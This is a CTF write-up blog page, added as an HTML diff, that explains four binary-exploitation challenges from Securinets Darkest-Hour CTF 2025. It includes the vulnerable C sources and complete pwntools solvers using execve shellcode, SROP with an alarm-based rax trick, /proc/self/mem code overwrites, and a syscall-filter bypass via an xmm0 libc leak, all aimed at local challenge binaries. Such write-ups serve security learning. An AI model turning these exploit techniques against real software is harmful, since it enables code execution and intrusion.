@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="assets/images/luffy.jpg" sizes="any">
+    <link rel="icon" href="assets/images/luffy.jpg" type="image/svg+xml">
+    <link rel="stylesheet" href="/assets/styles/global.css">
+    <title>Securinets Darkest-Hour CTF 2025  | PWN writeups | Buddurid's blog</title>
+
+    <!-- SEO Metadata -->
+    <meta property="og:title" content="Securinets Darkest-Hour CTF 2025  | PWN writeups | Buddurid's blog" />
+    <meta property="og:site_name" content="Buddurid's blog" />
+    <meta property="description" content="challenges explained + solvers" />
+    <meta property="og:description" content="challenges explained + solvers" />
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:4000/assets/images/luffy.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#FFBD3F" />
+    <link rel="canonical" href="http://localhost:4000/2025/02/15/Darkest-Hour-CTF-2025" />
+
+    <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+
+</head>
+<body><div class="load" id="load">
+    <pre class="term" id="term">buddurid@CTF:~$ </pre>
+    <script src="/assets/splashscreen.js"></script>
+</div><nav class="open">
+    <div class="hex" role="img" aria-label="Navigation bar background graphic, styled like the address panel of a hex editor.">
+        <ol><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/></ol>
+    </div>
+    <ul>
+        <li id="splash-hack-zero-for-reference" aria-hidden="true">0</li><li >
+                <a href="/"
+                   title="Me">Me</a>
+            </li><li style="z-index: 1;">
+                <a href="/blog"
+                   title="Blog"highlighted>Blog</a>
+            </li><li >
+                <a href="/ctfs"
+                   title="CTFs">CTFs</a>
+            </li></ul>
+
+</nav>
+
+<div class="nav-toggle hamburger-container">
+    <div class="hamburger-button"></div>
+</div>
+
+
+<script>
+    const responsiveNavThreshold = 500;
+    const navOpener = document.querySelector('.nav-toggle');
+    const nav = document.querySelector('nav');
+
+    const toggle = (cl, attr) => cl.contains(attr) ? cl.remove(attr) : cl.add(attr);
+
+    navOpener.addEventListener('click', () => {
+        toggle(nav.classList, 'open');
+    });
+
+    let enabled = false;
+
+    const setResponsive = () => {
+        if (window.innerWidth < responsiveNavThreshold) {
+            if (enabled) return;
+            enabled = true;
+            nav.classList.remove('open');
+            navOpener.classList.add('enabled');
+        }
+        else {
+            if (!enabled) return;
+            enabled = false;
+            nav.classList.add('open');
+            navOpener.classList.remove('enabled');
+        }
+    };
+    setResponsive();
+    window.addEventListener('resize', setResponsive);
+</script>
+<div class="content">
+            <main>
+                <article>
+    <h1 class="post-title">Securinets Darkest-Hour CTF 2025  | PWN writeups</h1>
+    <p class="post-author-date"><b></b><em> - February 15, 2025</em></p>
+
+
+    <div class="tags">
+
+        <strong>Categories: </strong>
+
+        
+        <span>PWN</span>
+        
+        <span>shellcode</span>
+        
+        <span>SROP</span>
+        
+
+    </div>
+
+    <p><i>challenges explained + solvers</i></p>
+
+    <hr>
+
+    <h1 id="warmup">Warmup</h1>
+
+<pre><code class="language-C">int main(){
+    setup();
+    printf("%p\n",__environ);
+    char buf[0x50];
+    char c;
+    int i=0;
+
+    while(1) {
+        c=getchar();
+        if (c==0 | c=='\n')
+            break;
+        buf[i++]=c;
+        }
+    return 0;
+}
+</code></pre>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+</code></pre></div></div>
+
+<p>i thought it was a straight forward retshellcode with no null bytes . a stack leak was given with the <code class="language-plaintext highlighter-rouge">environ</code> leak . so i didnt even test it prior the ctf xD . After some time i realised that when overflowing the stack , we’re bound to overwrite the ‘i’ counter variable , i liked the idea so i kept it .</p>
+
+<p>Plan :</p>
+
+<ul>
+  <li>write an execve(‘/bin/sh’,0,0) shellcode with no null bytes . we can accomplish with avoiding instructions like <code class="language-plaintext highlighter-rouge">mov rsi,0</code> with <code class="language-plaintext highlighter-rouge">xor rsi,rsi</code> . the nullbyte of ‘/bin/sh’ string will be replaced with an ‘a’ in our input but will be xor’ed with an ‘a’ using our shellcode so we can null it out and we get a prope ‘/bin/sh’</li>
+  <li>overflow into the counter variable and we write the return address offset which is 0x68 . se next time , <code class="language-plaintext highlighter-rouge">i=0x68</code></li>
+  <li>now we are at the return address , we simply write our buffer address which we calculate from the <code class="language-plaintext highlighter-rouge">environ leak</code></li>
+  <li>GG</li>
+</ul>
+
+<p>Solver :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span>
+
+<span class="nb">file</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"main"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./main"</span><span class="p">)</span>
+
+<span class="n">buf</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x188</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+<span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="s">'''
+            xor rsi,rsi
+            xor rdx,rdx
+            mov al,0x3b
+            lea rdi,[rsp-0x70+0x47]
+            xor BYTE PTR [rdi],0x61
+            lea rdi,[rsp-0x70+0x40]
+            syscall
+              '''</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="sa">b</span><span class="s">"c"</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"/bin/sha"</span>  <span class="c1"># the xor line replaces the 'a' in /bin/sha iwith null byte as we are not allowed to write it
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">92</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x68</span><span class="p">))</span>   <span class="c1"># this goes into the counter so next time we write , we write at offset 0x68 which is the offset of return address
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="superrapperoperation">SuperRapperOPeration</h1>
+
+<p>tldr : srop challenge , syscall gadget was given , no other useful gadget tho</p>
+
+<p>you can read about the technique <a href="https://sharkmoos.medium.com/a-quick-demonstration-of-sigreturn-oriented-programming-d9ae98c3ab0e">here</a></p>
+
+<pre><code class="language-C">int main(){
+    setup();
+    alarm(60);
+    char buff[0x100];
+    read(0,buff,0x110);
+    return 0;
+}
+</code></pre>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+    Stripped:   No
+</code></pre></div></div>
+
+<p>Recon :</p>
+
+<ul>
+  <li>Pie disabled : means we can pivot stack to BSS</li>
+  <li>no libc given , challenge hints on SROP so thats mostly the plan</li>
+  <li>no <code class="language-plaintext highlighter-rouge">pop rax</code> or any rax related and useful gadget so we have to somehow control rax .</li>
+</ul>
+
+<p>Plan (the intended way) :</p>
+
+<ul>
+  <li>the intended way to control rax was to use the <code class="language-plaintext highlighter-rouge">alarm</code> function right when there is 0xf (which is the sigreturn sytem call number) seconds left in the alarm . read about its return value here <a href="https://man7.org/linux/man-pages/man2/alarm.2.html#RETURN_VALUE">link</a></li>
+  <li>we do some pivoting so we can set up the sigreturn frame and write “/bin/sh” at a known location in BSS</li>
+  <li>we pivot then return to our ropchain that looks like this : alarm + syscall + sigframe</li>
+  <li>concering the sigframe , we can ignore a l large number of useless registers as they dont concern us .</li>
+</ul>
+
+<p>Solver :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
+from time import sleep
+context.arch = 'amd64'
+
+def debug():
+        if local&lt;2:
+                gdb.attach(p,'''
+                        b* 0x0000000000401179
+                           c
+                        ''')
+###############   files setup   ###############
+local=len(sys.argv)
+exe=ELF("./main")
+libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+nc="nc localhost 5000"
+port=int(nc.split(" ")[2])
+host=nc.split(" ")[1]
+
+############### remote or local ###############
+if local&gt;1:
+        p=remote(host,port)
+else:
+        p=process([exe.path])
+
+############### helper functions ##############
+def send():
+        pass
+
+############### main exploit    ###############
+
+main=exe.symbols["main"]
+#debug()
+rbp=0x0000000000404000+0xe00
+p.send(b"a"*0x100+p64(rbp)+p64(main+31))
+sleep(0.5)
+alarm=0x0000000000401040
+leave=0x00000000004011bb
+syscall=0x0000000000401179
+
+frame = SigreturnFrame()
+frame.rax=0x3b
+frame.rdi=0x404d78
+frame.rsi=0
+frame.rdx=0
+frame.rip=syscall
+frame.r15=u64("/bin/sh\x00")
+#print(frame)
+#print(len(frame))
+_rop=p64(alarm)+p64(syscall)+bytes(frame)[:0xe8]
+sleep(60-0xf-1)  # tried and it works ; the -1 for remote
+p.send(p64(rbp)+_rop.ljust(0xf8,p8(0))+p64(rbp-0x100)+p64(leave))
+p.interactive()
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="write_syndrom">write_syndrom</h1>
+
+<pre><code class="language-C">int main(){
+    setup();
+    char file_path[0x40]={0};
+    puts("give file name");
+    fgets(file_path,sizeof(file_path),stdin);
+    long b=strcspn(file_path,"\n");
+    file_path[b]=0;
+
+    if (access(file_path, W_OK) == 0) {
+
+        int fd =open(file_path,O_WRONLY);
+        if (fd&lt;=0){
+            puts("[-] couldnt open file for some reason");
+            exit(-1);
+        }
+        unsigned long position=0;
+        puts("now give position where to write");
+        scanf("%llu%*c",&amp;position);
+        if (lseek(fd,position,SEEK_SET)&lt;0){
+            puts("[-] lseek failed for some reason");
+            exit(-1);
+        }
+        printf("you will write up to 16 bytes at the postion %x\nnow give your payload\n",position);
+        char payload[16]={0};
+        if (write(fd,payload,read(0,payload,16))&lt;=0) {
+            puts("[-] write() error");
+            exit(-1);
+        }
+        close(fd);
+        return 0;
+    }
+    else{
+        puts("[-] file doesnt exist or isnt writable");
+        exit(-1);
+
+    }
+
+    return 0;
+}
+</code></pre>
+
+<p>tldr : you can open any file you want and write 16 bytes to it . RCE needed</p>
+
+<p>in the midst of the ctf , i gave a hint about proc files . reading this <a href="https://docs.kernel.org/filesystems/proc.html">proc fs</a> , we notice an interesting file <em>mem</em> : Memory held by this process . looking further into this specific file, we find this <a href="https://blog.cloudflare.com/diving-into-proc-pid-mem/#what-does-proc-pid-mem-do">link</a>, it shows that we can read and write to this file , and it will be just like writing to the memory of the process , one thing more interesting about it is that we can write in non writeable memory .</p>
+
+<p>Plan :</p>
+
+<ul>
+  <li>open ‘/proc/self/mem’ , overwrite some code of main , typically the one right after <em>write</em> with a shellcode of our own .</li>
+  <li>we only have 16 bytes shellcode , so we need to write the string /bin/sh beforehand , the intended way was to write it right after the prompted filename , seperated by null byte .</li>
+  <li>try to write a very minimalistic shellcode so it fits into 16 bytes</li>
+</ul>
+
+<p>Solver :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span>
+<span class="c1">#p=process("./chal")
+</span><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span><span class="mi">7004</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"/proc/self/mem</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x00000000004013c5</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">shellcode</span><span class="o">=</span><span class="s">'''
+    lea rdi, [rsp+0x2f]
+    xor esi,esi
+    xor edx,edx
+    mov eax,0x3b
+    syscall
+'''</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="dhlam">DHlam</h1>
+
+<pre><code class="language-C">char shellcode[]="H1\xc0H1\xdbH1\xc9H1\xd2H1\xe4H1\xedH1\xf6H1\xffM1\xc0M1\xc9M1\xd2M1\xdbM1\xe4M1\xedM1\xf6M1\xff";
+int sanitize(char * code){
+    for (int i=0;i&lt;0x500;i++){
+
+        if (memcmp(code+i,"\x0f\x05",2)==0) return 0;
+        if (memcmp(code+i,"\xcd\x80",2)==0) return 0;
+        if (memcmp(code+i,"\x0f4",2)==0) return 0;
+    }
+    return 1;
+}
+void setup(){
+    setbuf(stdin,0);
+    setbuf(stdout,0);
+
+}
+int main(){
+
+    setup();
+    puts("dahdes fel dhalma !!");
+
+    char * code=mmap((void*)0x13371337,0x1000,7,MAP_ANONYMOUS|MAP_PRIVATE,-1,0);
+    memcpy(code,shellcode,sizeof(shellcode));
+
+    read(0,(char*)code+sizeof(shellcode)-1,0x100);
+
+    if (!sanitize(code+sizeof(shellcode)-1)){
+        puts("rabi yehdi !!");
+        exit(-1);
+    }
+
+    mprotect(code,0x1000,PROT_READ|PROT_EXEC);
+
+
+    if (arch_prctl(0x1002, 0) != 0) {
+        perror("Failed to clear FS");
+    }
+    ((void (*)()) code) ();
+
+    return 0;
+}
+
+</code></pre>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+</code></pre></div></div>
+
+<p>tldr : read shellcode place it in r-x memory then execute it .</p>
+
+<p>Notes :</p>
+
+<ul>
+  <li>before executing the user shellcode , it nulls out all registers (or did I , xd)</li>
+  <li>our shellcode is filtered from these instructions : syscall - sysenter , int 0x80 which are the backbone of any code execution .</li>
+  <li>even fs register is cleared (usually fs points somewhere in tls which can lead to libc ) , gs registered is nulled out by default .</li>
+  <li>our shellcode is in r-x region , so it cant mutate and overwrite itself as memory isnt rightable</li>
+</ul>
+
+<p>Solution :</p>
+
+<ul>
+  <li>use one of the 128 bits register to try and find any leak so we can eventually get to libc .</li>
+  <li>the one i tested out was xmm0 which had libc value in its lower 64 bits .</li>
+  <li>now that we have libc we calculate libc base then set rdi to ‘/bin/sh’ pointer then jump to a syscall gadget in libc (you can also jump to system)</li>
+  <li>GG</li>
+</ul>
+
+<p>Solver :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        b* main+290
+                        c
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc localhost 7000"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span>
+<span class="n">binsh</span><span class="o">=</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>
+<span class="n">system</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+<span class="n">syscall</span><span class="o">=</span><span class="mh">0x00000000000264a3</span>
+<span class="n">shellcode</span><span class="o">=</span><span class="sa">f</span><span class="s">'''
+        movq rbx,xmm0
+        sub rbx,0x1d7643
+        mov rdi , rbx
+        add rdi , </span><span class="si">{</span><span class="n">binsh</span><span class="si">}</span><span class="s">
+
+        mov rcx ,rbx
+        add rcx, </span><span class="si">{</span><span class="n">syscall</span><span class="si">}</span><span class="s">
+        xor rsi,rsi
+        xor rdx,rdx
+        mov rax,0x3b
+        jmp rcx
+
+'''</span>
+
+<span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="c1">#debug()
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+</article>
+
+            </main><footer>
+    <div class="window-container">
+        <div class="window">
+            <div class="contacts">
+                <p><a href="https://github.com/buddurid">Github</a></p>
+                <p><a href="mailto:bbahae624@gmail.com">Email</a></p>
+                <p><a href="https://x.com/buddurid">Twitter</a></p>
+                <p><a href="https://www.linkedin.com/in/bahae-bahrini/">LinkedIn</a></p>
+                <p><a href="">Discord:#buddurid</a></p>
+                <p><a href="">CTFTime</a></p>
+            </div>
+            <p>©2024    Buddurid</p>
+            <p>Hosted on <a href="https://github.com/buddurid/buddurid.github.io/">GitHub Pages.</a></p>
+        </div>
+    </div>
+    <script src="/assets/footer-fix.js"></script>
+</footer>
+</div>
+    </body>
+</html>
